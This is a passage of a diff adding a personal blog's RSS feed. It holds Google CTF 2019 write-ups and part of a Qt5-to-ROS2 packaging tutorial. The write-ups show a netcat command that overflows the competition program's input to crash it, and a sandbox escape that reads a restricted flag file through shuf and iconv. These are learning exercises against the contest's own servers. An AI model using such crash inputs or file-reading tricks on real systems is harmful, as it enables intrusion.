+&lt;&#x2F;span&gt;&lt;span&gt;Cauliflower systems never crash &amp;gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
+&lt;&#x2F;span&gt;&lt;span&gt;segfault detected! ***CRASH***could not open flag
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This clearly crashes the program! So let&#x27;s try the same thing on official server but with a little help from python to automate our input:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$python2 -c &amp;quot;print &amp;#39;run&amp;#39;;print &amp;#39;A&amp;#39;*999&amp;quot; | nc buffer-overflow.ctfcompetition.com 1337
+&lt;&#x2F;span&gt;&lt;span&gt;Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using &amp;#39;run&amp;#39; command.
+&lt;&#x2F;span&gt;&lt;span&gt; Bonus flag for controlling the crash.
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;Console commands:
+&lt;&#x2F;span&gt;&lt;span&gt;run
+&lt;&#x2F;span&gt;&lt;span&gt;quit
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;gt;Inputs: run
+&lt;&#x2F;span&gt;&lt;span&gt;CTF{Why_does_cauliflower_threaten_us}
+&lt;&#x2F;span&gt;&lt;span&gt;Cauliflower systems never crash &amp;gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;segfault detected! ***CRASH***
+&lt;&#x2F;span&gt;&lt;span&gt;Console commands:
+&lt;&#x2F;span&gt;&lt;span&gt;run
+&lt;&#x2F;span&gt;&lt;span&gt;quit
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Here we got the next flag! So doing this we finally come to the end of this route that we had taken. Let&#x27;s go back to the other route now in the &lt;a href=&quot;&#x2F;posts&#x2F;google-ctf-writeups-part-2&#x2F;&quot;&gt;next part&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
+</description>
+        </item>
+        <item>
+            <title>Writeups for Google CTF 2019: My first CTF (Kinda) - Part 2</title>
+            <pubDate>Sat, 29 Jun 2019 00:00:00 +0000</pubDate>
+            <link>https://amar-laksh.github.io/posts/google-ctf-writeups-part-2/</link>
+            <guid>https://amar-laksh.github.io/posts/google-ctf-writeups-part-2/</guid>
+            <description>&lt;h2 id=&quot;work-computer-sandbox&quot;&gt;Work Computer - Sandbox&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;work_computer.png&quot; alt=&quot;work_computer.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We connect to the given server on the given port and see what we are up against by using netcat (&lt;code&gt;nc readme.ctfcompetition.com 1337&lt;&#x2F;code&gt;):&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;gt; help
+&lt;&#x2F;span&gt;&lt;span&gt;Alien&amp;#39;s shell
+&lt;&#x2F;span&gt;&lt;span&gt;Type program names and arguments, and hit enter.
+&lt;&#x2F;span&gt;&lt;span&gt;The following are built in:
+&lt;&#x2F;span&gt;&lt;span&gt;  cd
+&lt;&#x2F;span&gt;&lt;span&gt;  help
+&lt;&#x2F;span&gt;&lt;span&gt;  exit
+&lt;&#x2F;span&gt;&lt;span&gt;Use the man command for information on other programs.
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So clearly this is some kind of shell, let&#x27;s try doing an ls:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;ls -l
+&lt;&#x2F;span&gt;&lt;span&gt;total 8
+&lt;&#x2F;span&gt;&lt;span&gt;----------    1 1338     1338            33 Jul  4 12:07 ORME.flag
+&lt;&#x2F;span&gt;&lt;span&gt;-r--------    1 1338     1338            28 Jul  4 12:07 README.flag
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we can see that we can at least read &lt;code&gt;README.flag&lt;&#x2F;code&gt;, trying to do that we find:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;gt; cat README.flag
+&lt;&#x2F;span&gt;&lt;span&gt;error: No such file or directory
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So we find we can&#x27;t use &lt;code&gt;cat&lt;&#x2F;code&gt; or any other kind of usual command to output the flag. How do we know this? Let&#x27;s try listing all the commands avaialabe in the &lt;code&gt;&#x2F;usr&#x2F;bin&#x2F;&lt;&#x2F;code&gt;. We quickly find that there are no commands such as &lt;code&gt;cat&lt;&#x2F;code&gt;, &lt;code&gt;less&lt;&#x2F;code&gt; etc.&lt;&#x2F;p&gt;
+&lt;p&gt;Okay so let&#x27;s try enumerating all the interesting directories where we can find some obscure program to output our flag:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;gt; ls -l &#x2F;bin &#x2F;sbin &#x2F;usr&#x2F;bin &#x2F;usr&#x2F;sbin                                         
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;bin:
+&lt;&#x2F;span&gt;&lt;span&gt;total 800
+&lt;&#x2F;span&gt;&lt;span&gt;lrwxrwxrwx    1 65534    65534           12 May  9 20:49 arch -&amp;gt; &#x2F;bin&#x2F;busybox
+&lt;&#x2F;span&gt;&lt;span&gt;-rwxr-xr-x    1 65534    65534       796240 Jan 24 07:45 busybox
+&lt;&#x2F;span&gt;&lt;span&gt;lrwxrwxrwx    1 65534    65534           12 May  9 20:49 chgrp -&amp;gt; &#x2F;bin&#x2F;busybox
+&lt;&#x2F;span&gt;&lt;span&gt;lrwxrwxrwx    1 65534    65534           12 May  9 20:49 chown -&amp;gt; &#x2F;bin&#x2F;busybox
+&lt;&#x2F;span&gt;&lt;span&gt;lrwxrwxrwx    1 65534    65534           12 May  9 20:49 conspy -&amp;gt; &#x2F;bin&#x2F;busybox
+&lt;&#x2F;span&gt;&lt;span&gt;..............
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;sbin:
+&lt;&#x2F;span&gt;&lt;span&gt;total 228
+&lt;&#x2F;span&gt;&lt;span&gt;lrwxrwxrwx    1 65534    65534           12 May  9 20:49 acpid -&amp;gt; &#x2F;bin&#x2F;busybox
+&lt;&#x2F;span&gt;&lt;span&gt;lrwxrwxrwx    1 65534    65534           12 May  9 20:49 adjtimex -&amp;gt; &#x2F;bin&#x2F;busybox
+&lt;&#x2F;span&gt;&lt;span&gt;..............
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;usr&#x2F;bin:
+&lt;&#x2F;span&gt;&lt;span&gt;total 1984
+&lt;&#x2F;span&gt;&lt;span&gt;lrwxrwxrwx    1 65534    65534           12 May  9 20:49 [ -&amp;gt; &#x2F;bin&#x2F;busybox
+&lt;&#x2F;span&gt;&lt;span&gt;lrwxrwxrwx    1 65534    65534           12 May  9 20:49 [[ -&amp;gt; &#x2F;bin&#x2F;busybox
+&lt;&#x2F;span&gt;&lt;span&gt;..............
+&lt;&#x2F;span&gt;&lt;span&gt;-rwxr-xr-x    1 65534    65534        25216 Mar 19 09:56 iconv
+&lt;&#x2F;span&gt;&lt;span&gt;..............
+&lt;&#x2F;span&gt;&lt;span&gt;-rwxr-xr-x    1 65534    65534        83744 Nov 15  2018 scanelf
+&lt;&#x2F;span&gt;&lt;span&gt;..............
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;usr&#x2F;sbin:
+&lt;&#x2F;span&gt;&lt;span&gt;total 16
+&lt;&#x2F;span&gt;&lt;span&gt;lrwxrwxrwx    1 65534    65534           12 May  9 20:49 addgroup -&amp;gt; &#x2F;bin&#x2F;busybox
+&lt;&#x2F;span&gt;&lt;span&gt;lrwxrwxrwx    1 65534    65534           12 May  9 20:49 adduser -&amp;gt; &#x2F;bin&#x2F;busybox
+&lt;&#x2F;span&gt;&lt;span&gt;..............
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; 
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Looking through the list I happen to come across two commands I have not seen or noticed before! The commands are: &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;1&#x2F;shuf&quot;&gt;shuf&lt;&#x2F;a&gt; and &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;1&#x2F;iconv&quot;&gt;iconv&lt;&#x2F;a&gt;. We look up the man pages for them and find that both of them write file contents to stdout! Exactly what we want to do:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;gt; shuf README.flag
+&lt;&#x2F;span&gt;&lt;span&gt;CTF{4ll_D474_5h4ll_B3_Fr33}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; iconv &#x2F;challenge&#x2F;README.flag
+&lt;&#x2F;span&gt;&lt;span&gt;CTF{4ll_D474_5h4ll_B3_Fr33}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Here&#x27;s our flag!&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;friendspacebookplusallaccessredpremium-com-reversing&quot;&gt;FriendSpaceBookPlusAllAccessRedPremium.com  - Reversing&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;friends.png&quot; alt=&quot;friends.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+</description>
+        </item>
+        <item>
+            <title>Convert&#x2F;Run Qt5 app into&#x2F;as a ROS2 package</title>
+            <pubDate>Sun, 24 Jun 2018 00:00:00 +0000</pubDate>
+            <link>https://amar-laksh.github.io/posts/qt5-package-as-ros2-node/</link>
+            <guid>https://amar-laksh.github.io/posts/qt5-package-as-ros2-node/</guid>
+            <description>&lt;p&gt;So you want to run your Qt5 app as a ros2 node?, Here we go&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;step-1-build-the-qt5-app&quot;&gt;Step - 1: Build the Qt5 App&lt;&#x2F;h3&gt;
+&lt;p&gt;The first thing you need to do is to convert your Qt5 app to a ros2 package so that you can build it using: &lt;code&gt;ament build&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;Let&#x27;s make an example Qt5 app to showcase this!&lt;&#x2F;p&gt;
+&lt;p&gt;After installing Qt creator we get two types of Qt Quick apps we can make. They differ on the build system they use:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;qmake apps&lt;&#x2F;li&gt;
+&lt;li&gt;cmake apps&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Let&#x27;s have a look at how to make each one of them:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;This is the qmake build system app -
+&lt;img src=&quot;&#x2F;images&#x2F;qt5_qmake_app.gif&quot; alt=&quot;Qt5 qmake app&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;This is the cmake build system app -
+&lt;img src=&quot;&#x2F;images&#x2F;qt5_cmake_app.gif&quot; alt=&quot;Qt5 cmake app&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;step-2-depending-on-the-build-format-create-extend-cmakelists-txt&quot;&gt;Step - 2: Depending on the build format, create&#x2F;extend CMakeLists.txt&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Here we have two different steps for the Qt5 app depending on the build system you chose, you&#x27;ll get these directory structures:&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; CMake:
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; CMakeLists.txt
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; CMakeLists.txt.user
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; main.cpp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; main.qml
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; Page1Form.ui.qml
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; Page2Form.ui.qml
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; qml.qrc
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;└──&lt;&#x2F;span&gt;&lt;span&gt; qtquickcontrols2.conf
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt; directories, 8 files
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; qmake:
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; demo.pro
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; demo.pro.user
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; main.cpp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; main.qml
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; Page1Form.ui.qml
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; Page2Form.ui.qml
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; qml.qrc
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;└──&lt;&#x2F;span&gt;&lt;span&gt; qtquickcontrols2.conf
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt; directories, 8 files
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Smply open the CMakeLists.txt to edit and in the case of a qmake build create &lt;code&gt;CMakeLists.txt&lt;&#x2F;code&gt;, make it look like this:&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;cmake&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-cmake &quot;&gt;&lt;code class=&quot;language-cmake&quot; data-lang=&quot;cmake&quot;&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;cmake_minimum_required&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;VERSION &lt;&#x2F;span&gt;&lt;span&gt;3.5)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;project&lt;&#x2F;span&gt;&lt;span&gt;(demo)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;set &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;CMAKE_CXX_STANDARD &lt;&#x2F;span&gt;&lt;span&gt;14)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(NOT WIN32)
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;CMAKE_CXX_FLAGS &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;CMAKE_CXX_FLAGS&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;} -std=c++14 -Wall -Wextra -fPIC&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;endif&lt;&#x2F;span&gt;&lt;span&gt;()
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;IF &lt;&#x2F;span&gt;&lt;span&gt;(NOT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;DEFINED &lt;&#x2F;span&gt;&lt;span&gt;BUILD_VERSION)
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;SET&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;BUILD_VERSION &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;not set&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ENDIF&lt;&#x2F;span&gt;&lt;span&gt;()
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;ADD_DEFINITIONS&lt;&#x2F;span&gt;&lt;span&gt;(-DBUILD_VERSION=&amp;quot;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;BUILD_VERSION&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;}&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;find_package&lt;&#x2F;span&gt;&lt;span&gt;(ament_cmake &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;REQUIRED&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;find_package&lt;&#x2F;span&gt;&lt;span&gt;(rclcpp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;REQUIRED&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;find_package&lt;&#x2F;span&gt;&lt;span&gt;(rmw_implementation &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;REQUIRED&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;find_package&lt;&#x2F;span&gt;&lt;span&gt;(std_msgs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;REQUIRED&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;find_package&lt;&#x2F;span&gt;&lt;span&gt;(Qt5Core &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;REQUIRED&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;find_package&lt;&#x2F;span&gt;&lt;span&gt;(Qt5Quick &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;REQUIRED&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;CMAKE_AUTOMOC &lt;&#x2F;span&gt;&lt;span&gt;ON)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;CMAKE_AUTOUIC &lt;&#x2F;span&gt;&lt;span&gt;ON)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;CMAKE_AUTORCC &lt;&#x2F;span&gt;&lt;span&gt;ON)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;CMAKE_INCLUDE_CURRENT_DIR &lt;&#x2F;span&gt;&lt;span&gt;ON)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;include_directories&lt;&#x2F;span&gt;&lt;span&gt;(
+&lt;&#x2F;span&gt;&lt;span&gt;	${&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rclcpp_INCLUDE_DIRS&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;	${&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;std_msgs_INCLUDE_DIRS&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;	${&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Qt5Core_INCLUDE_DIRS&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;	${&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Qt5Quick_INCLUDE_DIRS&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;	)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOB &lt;&#x2F;span&gt;&lt;span&gt;SOURCE_FILES
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;src&#x2F;*.cpp&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;	)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;add_executable&lt;&#x2F;span&gt;&lt;span&gt;(${&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;PROJECT_NAME&lt;&#x2F;span&gt;&lt;span&gt;} ${&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SOURCE_FILES&lt;&#x2F;span&gt;&lt;span&gt;} &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;src&#x2F;qml.qrc&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ament_target_dependencies&lt;&#x2F;span&gt;&lt;span&gt;(${&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;PROJECT_NAME&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;	rclcpp
+&lt;&#x2F;span&gt;&lt;span&gt;	std_msgs
+&lt;&#x2F;span&gt;&lt;span&gt;	rmw_implementation
+&lt;&#x2F;span&gt;&lt;span&gt;	)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;target_link_libraries&lt;&#x2F;span&gt;&lt;span&gt;(${&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;PROJECT_NAME&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;	Qt5::Core
+&lt;&#x2F;span&gt;&lt;span&gt;	Qt5::Quick
+&lt;&#x2F;span&gt;&lt;span&gt;	)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;install&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;TARGETS &lt;&#x2F;span&gt;&lt;span&gt;${&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;PROJECT_NAME&lt;&#x2F;span&gt;&lt;span&gt;} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;DESTINATION &lt;&#x2F;span&gt;&lt;span&gt;bin)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ament_package&lt;&#x2F;span&gt;&lt;span&gt;()
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;step-3-create-a-package-xml-and-add-it-to-project&quot;&gt;Step - 3: Create a &lt;code&gt;package.xml&lt;&#x2F;code&gt; and add it to project&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;ROS2 needs a package.xml to find build and execution dependencies and to state metadata.&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;A simple package.xml looks like this:&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;xml&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt;
